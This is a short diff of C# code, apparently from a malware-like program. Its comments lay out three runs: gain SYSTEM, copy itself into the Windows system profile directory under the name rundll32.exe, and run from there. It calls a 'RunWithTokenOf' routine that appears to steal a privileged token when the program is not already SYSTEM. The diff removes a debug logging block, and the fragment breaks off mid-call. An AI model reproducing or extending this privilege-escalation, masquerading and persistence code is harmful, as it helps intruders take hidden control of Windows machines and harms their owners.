@@ -24,27 +24,14 @@ namespace Memory
         {
             // TODO Code is a mess, will clean soon
             // First run: Gains system
-            // Second run: Creates copy
-            // Third run: Final
-
-            // DEBUG
-            string debugFile = @"D:\log.txt";
-            string debugPrefix = DateTime.Now + " | ";
-            string debugInfo = Process.GetCurrentProcess().MainModule.FileName;
-            using (StreamWriter sw = File.AppendText(debugFile))
-            {
-                if (!File.Exists(debugFile)) File.Create(debugFile);
-
-                sw.WriteLine(debugPrefix + debugInfo);
-            }
-            // DEBUG
-
+            // Second run: Creates copy in system profile directory
+            // Third run: Runs from system profile directory
 
             Process process = Process.GetCurrentProcess();
             if (process.MainModule == null) return;
             string currentPath = process.MainModule.FileName;
             const string finalPath = @"C:\Windows\System32\config\systemprofile\rundll32.exe";
-            if (currentPath == finalPath) return; // Third run exit
+            if (currentPath == finalPath) return; // Third run return
             if (Environment.UserName.ToLower() is not "system" and not @"anon$")
             {
                 Sudoku.RunWithTokenOf(
